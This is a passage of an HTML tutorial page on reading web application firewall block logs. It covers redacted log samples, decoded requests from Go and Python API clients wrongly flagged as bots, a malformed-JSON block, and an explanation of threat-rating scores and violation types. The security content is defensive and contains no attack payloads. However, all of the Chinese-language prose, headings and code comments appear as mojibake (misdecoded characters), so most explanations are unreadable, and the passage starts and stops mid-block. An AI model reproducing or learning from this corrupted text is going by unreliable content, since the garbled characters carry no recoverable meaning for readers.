<span class="code-string">"Non-browser Client"</span>      <span class="code-comment"># éç€è¦½å™¨ç”¨æˆ¶ç«¯ (å¦‚ç¨‹å¼ API å‘¼å«)</span>

<span class="code-comment"># è³‡è¨Šæ´©æ¼</span>
<span class="code-string">"Information Leakage"</span>     <span class="code-comment"># å¯èƒ½æ´©æ¼æ•æ„Ÿè³‡è¨Š</span>

<span class="code-comment"># æ‡‰ç”¨ç¨‹å¼æ´»å‹•</span>
<span class="code-string">"Other Application Activity"</span>  <span class="code-comment"># å…¶ä»–æ‡‰ç”¨ç¨‹å¼ç•°å¸¸æ´»å‹•</span>
<span class="code-string">"Abuse of Functionality"</span>  <span class="code-comment"># åŠŸèƒ½æ¿«ç”¨</span>

<span class="code-comment"># è§£æå™¨æ”»æ“Š</span>
<span class="code-string">"JSON Parser Attack"</span>      <span class="code-comment"># JSON è§£æå™¨æ”»æ“Š</span>
<span class="code-string">"XML Parser Attack"</span>       <span class="code-comment"># XML è§£æå™¨æ”»æ“Š</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- Case Studies -->
            <h3 style="margin-top: 3rem; margin-bottom: 1.5rem; font-family: 'JetBrains Mono', monospace; color: var(--amber); font-size: 0.875rem; text-transform: uppercase; letter-spacing: 0.1em;">æ¡ˆä¾‹åˆ†æ</h3>

            <!-- Case 1: Non-browser API Client -->
            <div class="card" style="margin-bottom: 1.5rem;">
                <span class="attack-badge badge-high">CASE 1</span>
                <h3><span class="icon">[API]</span> éç€è¦½å™¨å®¢æˆ¶ç«¯ API è«‹æ±‚è¢«é˜»æ“‹</h3>
                <p style="margin-bottom: 1rem;">å¸¸è¦‹æƒ…å¢ƒï¼šå¾Œç«¯æœå‹™é–“ API å‘¼å«è¢«èª¤åˆ¤ç‚ºå¨è„…</p>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--text-secondary); font-size: 0.875rem;">è„«æ•å¾Œçš„æ—¥èªŒç¯„ä¾‹ï¼š</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code>{
  <span class="code-keyword">"id"</span>: <span class="code-string">"2360740580025XXXXXX"</span>,
  <span class="code-keyword">"requestDatetime"</span>: <span class="code-string">"2025-11-27T11:52:09Z"</span>,
  <span class="code-keyword">"method"</span>: <span class="code-string">"GET"</span>,
  <span class="code-keyword">"url"</span>: <span class="code-string">"L29hcGkvYXBpL3Byb2R1Y3Qv..."</span>,  <span class="code-comment">// Base64: /oapi/api/product/...</span>
  <span class="code-keyword">"clientIp"</span>: <span class="code-string">"xxx.xxx.xxx.xxx"</span>,
  <span class="code-keyword">"requestStatus"</span>: <span class="code-danger">"blocked"</span>,
  <span class="code-keyword">"enforcementAction"</span>: <span class="code-danger">"block"</span>,
  <span class="code-keyword">"responseCode"</span>: <span class="code-danger">429</span>,
  <span class="code-keyword">"violations"</span>: [
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-string">"VIOL_HTTP_RESPONSE_STATUS"</span> }, <span class="code-keyword">"isBlocked"</span>: false },
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-danger">"VIOL_RATING_THREAT"</span> }, <span class="code-keyword">"isBlocked"</span>: <span class="code-danger">true</span> },
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-string">"VIOL_BOT_CLIENT"</span> }, <span class="code-keyword">"isBlocked"</span>: false }
  ],
  <span class="code-keyword">"enforcementState"</span>: {
    <span class="code-keyword">"isBlocked"</span>: <span class="code-danger">true</span>,
    <span class="code-keyword">"rating"</span>: <span class="code-danger">4</span>,
    <span class="code-keyword">"attackType"</span>: [
      { <span class="code-keyword">"name"</span>: <span class="code-string">"Non-browser Client"</span> },
      { <span class="code-keyword">"name"</span>: <span class="code-string">"Information Leakage"</span> },
      { <span class="code-keyword">"name"</span>: <span class="code-string">"Other Application Activity"</span> }
    ]
  },
  <span class="code-keyword">"rawRequest"</span>: {
    <span class="code-keyword">"httpRequest"</span>: <span class="code-string">"R0VUIC9vYXBpLy4uLg=="</span>  <span class="code-comment">// Base64 ç·¨ç¢¼çš„åŸå§‹è«‹æ±‚</span>
  }
}</code>
                </div>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--cyan); font-size: 0.875rem;">è§£ç¢¼ rawRequest åˆ†æï¼š</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code><span class="code-comment"># è§£ç¢¼å¾Œçš„ HTTP è«‹æ±‚ (å·²è„«æ•)</span>
GET /oapi/api/product/xxx/product/details? HTTP/1.1
Host: merchant-oapi.example.com
<span class="code-danger">User-Agent: Go-http-client/1.1</span>  <span class="code-comment"># â† é—œéµ! éç€è¦½å™¨ UA</span>
Content-Type: application/json
X-Auth-Token: eyJhbGciOi...  <span class="code-comment"># JWT Token (å·²é®è”½)</span>
Accept-Encoding: gzip

[{"skuCode":"P00XXXXX_S_IP919XXXX"}...]  <span class="code-comment"># è«‹æ±‚ Body</span></code>
                </div>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--phosphor); font-size: 0.875rem;">åˆ†æé‡é»ï¼š</h4>
                <ul style="color: var(--text-secondary); margin-top: 0.5rem; padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;"><strong>é˜»æ“‹åŸå› </strong>ï¼š<code style="color: var(--danger);">VIOL_RATING_THREAT</code> æ˜¯å¯¦éš›é€ æˆé˜»æ“‹çš„é•è¦</li>
                    <li style="margin-bottom: 0.5rem;"><strong>User-Agent</strong>ï¼š<code style="color: var(--amber);">Go-http-client/1.1</code> è§¸ç™¼äº† "Non-browser Client" åµæ¸¬</li>
                    <li style="margin-bottom: 0.5rem;"><strong>rating: 4</strong>ï¼šå¨è„…è©•åˆ†é”åˆ°é–¾å€¼ (é€šå¸¸ 4-5 æœƒè¢«é˜»æ“‹)</li>
                    <li style="margin-bottom: 0.5rem;"><strong>responseCode: 429</strong>ï¼šå¾Œç«¯å›å‚³ Too Many Requestsï¼ŒåŠ é‡äº†å¨è„…è©•åˆ†</li>
                </ul>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--amber); font-size: 0.875rem;">è§£æ±ºå»ºè­°ï¼š</h4>
                <ul style="color: var(--text-secondary); margin-top: 0.5rem; padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;">å°‡åˆæ³• API å®¢æˆ¶ç«¯ IP åŠ å…¥ WAF ç™½åå–®</li>
                    <li style="margin-bottom: 0.5rem;">ç‚ºå…§éƒ¨æœå‹™è¨­å®šè‡ªè¨‚ User-Agent ä¸¦åŠ å…¥ä¾‹å¤–</li>
                    <li style="margin-bottom: 0.5rem;">èª¿æ•´å¨è„…è©•åˆ†é–¾å€¼æˆ–ç‰¹å®š API è·¯å¾‘çš„æ•æ„Ÿåº¦</li>
                </ul>
            </div>

            <!-- Case 2: Python Requests Client -->
            <div class="card" style="margin-bottom: 1.5rem;">
                <span class="attack-badge badge-high">CASE 2</span>
                <h3><span class="icon">[BOT]</span> Python è‡ªå‹•åŒ–è…³æœ¬è¢«è­˜åˆ¥ç‚º Bot</h3>
                <p style="margin-bottom: 1rem;">å¸¸è¦‹æƒ…å¢ƒï¼šè‡ªå‹•åŒ–æ¸¬è©¦æˆ–æ‰¹æ¬¡è™•ç†è…³æœ¬è¢«é˜»æ“‹</p>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--text-secondary); font-size: 0.875rem;">è„«æ•å¾Œçš„æ—¥èªŒç¯„ä¾‹ï¼š</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code>{
  <span class="code-keyword">"id"</span>: <span class="code-string">"1759108076183XXXXXX"</span>,
  <span class="code-keyword">"method"</span>: <span class="code-string">"POST"</span>,
  <span class="code-keyword">"url"</span>: <span class="code-string">"L29hcGkvYXBpL29yZGVyL..."</span>,  <span class="code-comment">// Base64: /oapi/api/order/updateOrderStatus</span>
  <span class="code-keyword">"requestStatus"</span>: <span class="code-danger">"blocked"</span>,
  <span class="code-keyword">"responseCode"</span>: <span class="code-danger">500</span>,
  <span class="code-keyword">"violations"</span>: [
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-string">"VIOL_HTTP_RESPONSE_STATUS"</span> }, <span class="code-keyword">"isBlocked"</span>: false },
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-danger">"VIOL_RATING_THREAT"</span> }, <span class="code-keyword">"isBlocked"</span>: <span class="code-danger">true</span> },
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-string">"VIOL_BOT_CLIENT"</span> }, <span class="code-keyword">"isBlocked"</span>: false }
  ],
  <span class="code-keyword">"enforcementState"</span>: {
    <span class="code-keyword">"rating"</span>: <span class="code-danger">4</span>,
    <span class="code-keyword">"attackType"</span>: [
      { <span class="code-keyword">"name"</span>: <span class="code-string">"Non-browser Client"</span> },
      { <span class="code-keyword">"name"</span>: <span class="code-string">"Information Leakage"</span> }
    ]
  }
}</code>
                </div>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--cyan); font-size: 0.875rem;">è§£ç¢¼ rawRequest åˆ†æï¼š</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code><span class="code-comment"># è§£ç¢¼å¾Œçš„ HTTP è«‹æ±‚ (å·²è„«æ•)</span>
POST /oapi/api/order/updateOrderStatus HTTP/1.1
Host: merchant-oapi.example.com
<span class="code-danger">User-Agent: python-requests/2.25.1</span>  <span class="code-comment"># â† é—œéµ! Python åº«é è¨­ UA</span>
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/json
x-auth-token: eyJhbGciOi...

[{"orderNumber": "H251126XXXXX-HXXXXXX", "status": "PICKED", "trackingId": "XXXXXXXXXX"}]</code>
                </div>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--phosphor); font-size: 0.875rem;">åˆ†æé‡é»ï¼š</h4>
                <ul style="color: var(--text-secondary); margin-top: 0.5rem; padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;"><strong>User-Agent</strong>ï¼š<code style="color: var(--danger);">python-requests/2.25.1</code> æ˜¯ Python requests åº«çš„é è¨­å€¼</li>
                    <li style="margin-bottom: 0.5rem;"><strong>responseCode: 500</strong>ï¼šå¾Œç«¯éŒ¯èª¤ä¹Ÿå¯èƒ½æé«˜å¨è„…è©•åˆ†</li>
                    <li style="margin-bottom: 0.5rem;"><strong>åˆæ³•è«‹æ±‚</strong>ï¼šé€™æ˜¯æ­£å¸¸çš„è¨‚å–®ç‹€æ…‹æ›´æ–° API å‘¼å«</li>
                </ul>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--amber); font-size: 0.875rem;">è§£æ±ºå»ºè­°ï¼š</h4>
                <ul style="color: var(--text-secondary); margin-top: 0.5rem; padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;">åœ¨ç¨‹å¼ä¸­è¨­å®šè‡ªè¨‚ User-Agentï¼š<code style="color: var(--phosphor);">headers = {'User-Agent': 'MyApp/1.0 (Internal Service)'}</code></li>
                    <li style="margin-bottom: 0.5rem;">èˆ‡ WAF ç®¡ç†å“¡å”èª¿ï¼Œå°‡ç‰¹å®š API ç«¯é»æ’é™¤ Bot æª¢æ¸¬</li>
                </ul>
            </div>

            <!-- Case 3: JSON Malformed -->
            <div class="card" style="margin-bottom: 1.5rem;">
                <span class="attack-badge badge-critical">CASE 3</span>
                <h3><span class="icon">[JSON]</span> JSON æ ¼å¼éŒ¯èª¤å°è‡´è§£æå™¨æ”»æ“Šåµæ¸¬</h3>
                <p style="margin-bottom: 1rem;">å¸¸è¦‹æƒ…å¢ƒï¼šå¤§å‹ JSON è«‹æ±‚æˆ–ç‰¹æ®Šå­—å…ƒè§¸ç™¼æ ¼å¼æª¢æŸ¥</p>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--text-secondary); font-size: 0.875rem;">è„«æ•å¾Œçš„æ—¥èªŒç¯„ä¾‹ï¼š</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code>{
  <span class="code-keyword">"id"</span>: <span class="code-string">"1051815027092XXXXXX"</span>,
  <span class="code-keyword">"method"</span>: <span class="code-string">"PUT"</span>,
  <span class="code-keyword">"url"</span>: <span class="code-string">"L3Byb2R1Y3QvbGl0dGxlLW..."</span>,  <span class="code-comment">// Base64: /product/little-mall/products</span>
  <span class="code-keyword">"requestStatus"</span>: <span class="code-danger">"blocked"</span>,
  <span class="code-keyword">"responseCode"</span>: <span class="code-danger">0</span>,  <span class="code-comment">// è«‹æ±‚æœªåˆ°é”å¾Œç«¯</span>
  <span class="code-keyword">"violations"</span>: [
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-danger">"VIOL_JSON_MALFORMED"</span> }, <span class="code-keyword">"isBlocked"</span>: <span class="code-danger">true</span> },
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-danger">"VIOL_RATING_THREAT"</span> }, <span class="code-keyword">"isBlocked"</span>: <span class="code-danger">true</span> }
  ],
  <span class="code-keyword">"enforcementState"</span>: {
    <span class="code-keyword">"rating"</span>: <span class="code-danger">4</span>,
    <span class="code-keyword">"attackType"</span>: [
      { <span class="code-keyword">"name"</span>: <span class="code-string">"Abuse of Functionality"</span> },
      { <span class="code-keyword">"name"</span>: <span class="code-string">"Other Application Activity"</span> },
      { <span class="code-keyword">"name"</span>: <span class="code-danger">"JSON Parser Attack"</span> }
    ]
  },
  <span class="code-keyword">"rawRequest"</span>: {
    <span class="code-keyword">"actualSize"</span>: <span class="code-danger">4999</span>,  <span class="code-comment"># è¼ƒå¤§çš„è«‹æ±‚</span>
    <span class="code-keyword">"isTruncated"</span>: <span class="code-danger">true</span>  <span class="code-comment"># æ—¥èªŒè¢«æˆªæ–·</span>
  },
  <span class="code-keyword">"requestPolicy"</span>: { <span class="code-keyword">"fullPath"</span>: <span class="code-string">"xxx_specific_xss_bypass"</span> }
}</code>
                </div>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--cyan); font-size: 0.875rem;">è§£ç¢¼ rawRequest åˆ†æï¼š</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code><span class="code-comment"># è§£ç¢¼å¾Œçš„ HTTP è«‹æ±‚ (å·²è„«æ•)</span>
PUT /product/xxx/products HTTP/1.1
Host: merchant-product-api.example.com
Content-Length: 7457
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
Authorization: Bearer ****** <span class="code-comment"># å·²é®è”½</span>

{"product": {
  "id": "692757XXXXXX",
  "sku_name_ch": "å•†å“åç¨±åŒ…å«ç‰¹æ®Šå­—å…ƒ...",
  "sku_long_description_ch": "<span class="code-danger">&lt;p&gt;&lt;strong&gt;...HTML å…§å®¹...&lt;/strong&gt;&lt;/p&gt;</span>
    <span class="code-danger">&lt;img src=\"https://...\"&gt;</span>..."  <span class="code-comment"># â† å¯èƒ½è¢«æˆªæ–·æˆ–åŒ…å«å•é¡Œå­—å…ƒ</span>
  ...
}}</code>
                </div>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--phosphor); font-size: 0.875rem;">åˆ†æé‡é»ï¼š</h4>
                <ul style="color: var(--text-secondary); margin-top: 0.5rem; padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;"><strong>VIOL_JSON_MALFORMED</strong>ï¼šJSON æ ¼å¼æª¢æŸ¥å¤±æ•—</li>
                    <li style="margin-bottom: 0.5rem;"><strong>isTruncated: true</strong>ï¼šæ—¥èªŒéå¤§è¢«æˆªæ–·ï¼Œå¯èƒ½å°è‡´è§£æå•é¡Œ</li>
                    <li style="margin-bottom: 0.5rem;"><strong>actualSize: 4999</strong>ï¼šè«‹æ±‚é«”è¼ƒå¤§ (ç´„ 5KB)</li>
                    <li style="margin-bottom: 0.5rem;"><strong>HTML å…§å®¹</strong>ï¼šJSON ä¸­åµŒå…¥çš„ HTML å¯èƒ½åŒ…å«è§¸ç™¼è¦å‰‡çš„å­—å…ƒ</li>
                    <li style="margin-bottom: 0.5rem;"><strong>responseCode: 0</strong>ï¼šè«‹æ±‚åœ¨ WAF å±¤å°±è¢«é˜»æ“‹ï¼Œæœªåˆ°é”å¾Œç«¯</li>
                </ul>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--amber); font-size: 0.875rem;">è§£æ±ºå»ºè­°ï¼š</h4>
                <ul style="color: var(--text-secondary); margin-top: 0.5rem; padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;">æª¢æŸ¥ JSON æ ¼å¼æ˜¯å¦æ­£ç¢ºï¼Œç‰¹åˆ¥æ˜¯ç‰¹æ®Šå­—å…ƒçš„è·³è„«</li>
                    <li style="margin-bottom: 0.5rem;">è‹¥ç‚ºåˆæ³• HTML å…§å®¹ï¼Œèª¿æ•´ WAF ç­–ç•¥ä»¥å…è¨±ç‰¹å®šæ¬„ä½å«æœ‰ HTML</li>
                    <li style="margin-bottom: 0.5rem;">è€ƒæ…®å°å¤§å‹å…§å®¹é€²è¡Œåˆ†æ®µä¸Šå‚³æˆ– Base64 ç·¨ç¢¼</li>
                </ul>
            </div>

            <!-- Log Analysis Tips -->
            <div class="rule-demo" style="margin-top: 2rem;">
                <h3 style="margin-bottom: 1rem;">å¿«é€Ÿåˆ†ææµç¨‹</h3>
                <div class="code-block">
                    <code>
<span class="code-keyword">STEP 1:</span> ç¢ºèªé˜»æ“‹ç‹€æ…‹
â””â”€ æª¢æŸ¥ <span class="code-string">requestStatus</span> å’Œ <span class="code-string">enforcementAction</span>

<span class="code-keyword">STEP 2:</span> æ‰¾å‡ºé€ æˆé˜»æ“‹çš„é•è¦
â””â”€ åœ¨ <span class="code-string">violations[]</span> ä¸­æ‰¾ <span class="code-danger">isBlocked: true</span> çš„é …ç›®

<span class="code-keyword">STEP 3:</span> åˆ†æå¨è„…é¡å‹
â””â”€ æŸ¥çœ‹ <span class="code-string">enforcementState.attackType[]</span> äº†è§£å…·é«”åŸå› 

<span class="code-keyword">STEP 4:</span> è§£ç¢¼åŸå§‹è«‹æ±‚
â””â”€ ä½¿ç”¨ Base64 è§£ç¢¼ <span class="code-string">rawRequest.httpRequest</span>
â””â”€ æ‰¾å‡ºè§¸ç™¼è¦å‰‡çš„ Header æˆ– Body å…§å®¹

<span class="code-keyword">STEP 5:</span> æ±ºå®šè™•ç†æ–¹å¼
â”œâ”€ <span class="code-phosphor">åˆæ³•è«‹æ±‚è¢«èª¤æ“‹</span> â†’ èª¿æ•´ WAF è¦å‰‡/ç™½åå–®
â””â”€ <span class="code-danger">å¯¦éš›æ”»æ“Š</span> â†’ åŠ å¼·ç›£æ§/å°é–ä¾†æº
                    </code>
                </div>
            </div>
        </section>

        <!-- VIOL_RATING_THREAT Tutorial Section -->
        <section id="viol-rating">
            <h2>VIOL_RATING_THREAT è©•åˆ†æ©Ÿåˆ¶</h2>
            <p style="color: var(--text-secondary); margin-bottom: 2rem;">æ·±å…¥äº†è§£ WAF å¨è„…è©•åˆ†ç³»çµ±çš„é‹ä½œåŸç†ï¼ŒæŒæ¡ä¸åŒé•è¦é¡å‹çš„é¢¨éšªåˆ†æ•¸ï¼Œå¿«é€Ÿå®šä½è«‹æ±‚è¢«é˜»æ“‹çš„çœŸæ­£åŸå› ã€‚</p>

            <!-- What is VIOL_RATING_THREAT -->
            <div class="accordion active">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>ä»€éº¼æ˜¯ VIOL_RATING_THREATï¼Ÿ</h4>
                    <span class="accordion-icon">â–¼</span>
                </div>
                <div class="accordion-content" style="max-height: 2000px; padding: 1.25rem;">
                    <p style="margin-bottom: 1rem;"><code style="color: var(--danger);">VIOL_RATING_THREAT</code> æ˜¯ WAF çš„<strong>å¨è„…è©•åˆ†é–¾å€¼é•è¦</strong>ã€‚ç•¶ä¸€å€‹è«‹æ±‚çš„ç´¯ç©å¨è„…è©•åˆ†é”åˆ°æˆ–è¶…éè¨­å®šçš„é–¾å€¼æ™‚ï¼Œå°±æœƒè§¸ç™¼æ­¤é•è¦ã€‚</p>

                    <div class="code-block">
                        <code>
<span class="code-comment"># VIOL_RATING_THREAT é‹ä½œæµç¨‹</span>

<span class="code-keyword">REQUEST</span> â†’ <span class="code-string">[WAF åˆ†æ]</span> â†’ <span class="code-keyword">ç´¯ç©å„ç¨®é•è¦çš„è©•åˆ†</span>

<span class="code-comment"># è©•åˆ†ç´¯ç©ç¯„ä¾‹</span>
â”œâ”€ VIOL_BOT_CLIENT          +1 åˆ†  <span class="code-comment">(åµæ¸¬åˆ° Bot)</span>
â”œâ”€ VIOL_HTTP_RESPONSE_STATUS +2 åˆ†  <span class="code-comment">(ç•°å¸¸å›æ‡‰ç‹€æ…‹)</span>
â””â”€ å…¶ä»–æ”»æ“Šç‰¹å¾µ             +1 åˆ†
                           â”€â”€â”€â”€â”€
<span class="code-keyword">ç¸½åˆ†:</span> <span class="code-danger">4 åˆ†</span> â†’ è¶…éé–¾å€¼ â†’ <span class="code-danger">VIOL_RATING_THREAT è§¸ç™¼é˜»æ“‹</span>
                        </code>
                    </div>

                    <p style="margin-top: 1rem; color: var(--text-secondary);">
                        <strong style="color: var(--amber);">é‡è¦è§€å¿µï¼š</strong>
                        <code style="color: var(--danger);">VIOL_RATING_THREAT</code> æœ¬èº«ä¸æ˜¯å…·é«”çš„æ”»æ“Šé¡å‹ï¼Œè€Œæ˜¯ã€Œè©•åˆ†è¶…æ¨™ã€çš„æŒ‡æ¨™ã€‚
                        è¦æ‰¾å‡ºçœŸæ­£çš„é˜»æ“‹åŸå› ï¼Œéœ€è¦åˆ†æ<strong>å“ªäº›é•è¦è²¢ç»äº†åˆ†æ•¸</strong>ã€‚
                    </p>
                </div>
            </div>

            <!-- Scoring System -->
            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>è©•åˆ†ç­‰ç´šèˆ‡é–¾å€¼</h4>
                    <span class="accordion-icon">â–¼</span>
                </div>
                <div class="accordion-content">
                    <p style="margin-bottom: 1rem;">WAF ä½¿ç”¨ 1-5 çš„è©•åˆ†ç­‰ç´šä¾†è©•ä¼°è«‹æ±‚çš„å¨è„…ç¨‹åº¦ï¼š</p>

                    <div class="card-grid" style="margin-bottom: 1.5rem;">
                        <div class="card" style="border-left: 3px solid var(--phosphor);">
                            <h3><span class="icon">[1]</span> æœ€ä½é¢¨éšª</h3>
                            <p>è¼•å¾®ç•°å¸¸ï¼Œé€šå¸¸ä¸æœƒé€ æˆé˜»æ“‹ã€‚ä¾‹å¦‚ï¼šç¼ºå°‘æŸäº›æ¨™æº– Headerã€‚</p>
                        </div>
                        <div class="card" style="border-left: 3px solid var(--cyan);">
                            <h3><span class="icon">[2]</span> ä½é¢¨éšª</h3>
                            <p>åµæ¸¬åˆ°æ½›åœ¨é¢¨éšªè¡Œç‚ºï¼Œä½†ä¸è¶³ä»¥å–®ç¨è§¸ç™¼é˜»æ“‹ã€‚ä¾‹å¦‚ï¼šéç€è¦½å™¨ User-Agentã€‚</p>
                        </div>
                        <div class="card" style="border-left: 3px solid var(--amber);">
                            <h3><span class="icon">[3]</span> ä¸­é¢¨éšª</h3>
                            <p>å¯ç–‘è¡Œç‚ºï¼Œå¯èƒ½èˆ‡å…¶ä»–å› ç´ ç´¯ç©å¾Œè§¸ç™¼é˜»æ“‹ã€‚ä¾‹å¦‚ï¼šç•°å¸¸åƒæ•¸æ ¼å¼ã€‚</p>
                        </div>
                        <div class="card" style="border-left: 3px solid #ff6b35;">
                            <h3><span class="icon">[4]</span> é«˜é¢¨éšª</h3>
                            <p>æ¥µå¯èƒ½æ˜¯æƒ¡æ„è«‹æ±‚ï¼Œé€šå¸¸æœƒè§¸ç™¼é˜»æ“‹ã€‚ä¾‹å¦‚ï¼šåŒ¹é…å·²çŸ¥æ”»æ“Šç‰¹å¾µã€‚</p>
                        </div>
                        <div class="card" style="border-left: 3px solid var(--danger);">
                            <h3><span class="icon">[5]</span> åš´é‡å¨è„…</h3>
                            <p>å¹¾ä¹ç¢ºå®šæ˜¯æ”»æ“Šè¡Œç‚ºï¼Œç«‹å³é˜»æ“‹ã€‚ä¾‹å¦‚ï¼šSQL æ³¨å…¥ã€å‘½ä»¤æ³¨å…¥ã€‚</p>
                        </div>
                    </div>

                    <div class="code-block">
                        <code>
<span class="code-comment"># å¸¸è¦‹é–¾å€¼è¨­å®š</span>
<span class="code-keyword">blocking_threshold</span>: <span class="code-danger">4</span>  <span class="code-comment"># è©•åˆ† >= 4 æ™‚è§¸ç™¼ VIOL_RATING_THREAT</span>

<span class="code-comment"># æ—¥èªŒä¸­çš„è©•åˆ†é¡¯ç¤º</span>
"enforcementState": {
  <span class="code-keyword">"isBlocked"</span>: <span class="code-danger">true</span>,
  <span class="code-keyword">"rating"</span>: <span class="code-danger">4</span>  <span class="code-comment"># â† é€™å°±æ˜¯ç´¯ç©çš„å¨è„…è©•åˆ†</span>
}
                        </code>
                    </div>
                </div>
            </div>

            <!-- Low Score VIOL Types -->
            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>ä½åˆ†é•è¦é¡å‹ (Rating 1-2)</h4>
                    <span class="accordion-icon">â–¼</span>
                </div>
                <div class="accordion-content">
                    <p style="margin-bottom: 1rem;">é€™äº›é•è¦é¡å‹é€šå¸¸<strong>ä¸æœƒå–®ç¨é€ æˆé˜»æ“‹</strong>ï¼Œä½†å¯èƒ½èˆ‡å…¶ä»–é•è¦ç´¯ç©ï¼š</p>

                    <div class="code-block">
                        <code>
<span class="code-comment"># è©•åˆ† 1-2 çš„é•è¦é¡å‹ï¼ˆä½é¢¨éšªï¼‰</span>

<span class="code-string">VIOL_BOT_CLIENT</span>              <span class="code-comment"># +1~2 åµæ¸¬åˆ°è‡ªå‹•åŒ–å·¥å…·/Bot</span>
â”œâ”€ éç€è¦½å™¨ User-Agent (å¦‚ curl, python-requests)
â”œâ”€ ç¼ºå°‘ç€è¦½å™¨æŒ‡ç´‹ç‰¹å¾µ
â””â”€ ç„¡ JavaScript åŸ·è¡Œèƒ½åŠ›

<span class="code-string">VIOL_HTTP_RESPONSE_STATUS</span>    <span class="code-comment"># +1~2 å¾Œç«¯å›å‚³ç•°å¸¸ç‹€æ…‹ç¢¼</span>
â”œâ”€ 4xx éŒ¯èª¤ (400, 401, 403, 404)
â”œâ”€ 5xx éŒ¯èª¤ (500, 502, 503)
â””â”€ 429 Too Many Requests

<span class="code-string">VIOL_HEADER_LENGTH</span>           <span class="code-comment"># +1 Header é•·åº¦ç•°å¸¸</span>
<span class="code-string">VIOL_COOKIE_LENGTH</span>           <span class="code-comment"># +1 Cookie é•·åº¦ç•°å¸¸</span>
<span class="code-string">VIOL_REQUEST_LENGTH</span>          <span class="code-comment"># +1~2 è«‹æ±‚é«”éå¤§</span>
<span class="code-string">VIOL_QUERY_STRING_LENGTH</span>     <span class="code-comment"># +1 æŸ¥è©¢å­—ä¸²éé•·</span>
                        </code>
                    </div>

                    <div style="background: var(--phosphor-glow); border: 1px solid var(--phosphor-dim); padding: 1rem; margin-top: 1rem;">
                        <p style="color: var(--phosphor); font-weight: 500;">ğŸ“Œ å¸¸è¦‹èª¤å ±æƒ…å¢ƒ</p>
                        <ul style="color: var(--text-secondary); margin-top: 0.5rem; padding-left: 1.5rem;">
                            <li style="margin-bottom: 0.5rem;">å¾Œç«¯ API æœå‹™ä½¿ç”¨ Go/Python/Node.js HTTP å®¢æˆ¶ç«¯å‘¼å«</li>
                            <li style="margin-bottom: 0.5rem;">æ‰¹æ¬¡è™•ç†è…³æœ¬æˆ–æ’ç¨‹ä»»å‹™</li>
                            <li style="margin-bottom: 0.5rem;">å¥åº·æª¢æŸ¥æ¢é‡ (Health Check)</li>
                            <li style="margin-bottom: 0.5rem;">ç¬¬ä¸‰æ–¹æœå‹™ Webhook å›å‘¼</li>
                        </ul>
                    </div>
                </div>
            </div>

            <!-- High Score VIOL Types -->
            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>é«˜åˆ†é•è¦é¡å‹ (Rating 3-5)</h4>
                    <span class="accordion-icon">â–¼</span>
                </div>
                <div class="accordion-content">
                    <p style="margin-bottom: 1rem;">é€™äº›é•è¦é¡å‹ä»£è¡¨<strong>é«˜é¢¨éšªæˆ–ç¢ºèªçš„æ”»æ“Šè¡Œç‚º</strong>ï¼Œå¯èƒ½å–®ç¨è§¸ç™¼é˜»æ“‹ï¼š</p>

                    <div class="code-block">
                        <code>
<span class="code-comment"># è©•åˆ† 3-5 çš„é•è¦é¡å‹ï¼ˆé«˜é¢¨éšªï¼‰</span>

<span class="code-danger">VIOL_ATTACK_SIGNATURE</span>        <span class="code-comment"># +3~5 åŒ¹é…æ”»æ“Šç‰¹å¾µåº«</span>
â”œâ”€ SQL Injection ç‰¹å¾µ
â”œâ”€ XSS (Cross-Site Scripting) ç‰¹å¾µ
â”œâ”€ Command Injection ç‰¹å¾µ
â”œâ”€ Path Traversal ç‰¹å¾µ
â””â”€ å…¶ä»– OWASP Top 10 æ”»æ“Š

<span class="code-danger">VIOL_JSON_MALFORMED</span>          <span class="code-comment"># +3~4 JSON æ ¼å¼éŒ¯èª¤/æ”»æ“Š</span>
â”œâ”€ ä¸åˆæ³•çš„ JSON èªæ³•
â”œâ”€ æ·±åº¦å·¢ç‹€çµæ§‹ (DoS æ”»æ“Š)
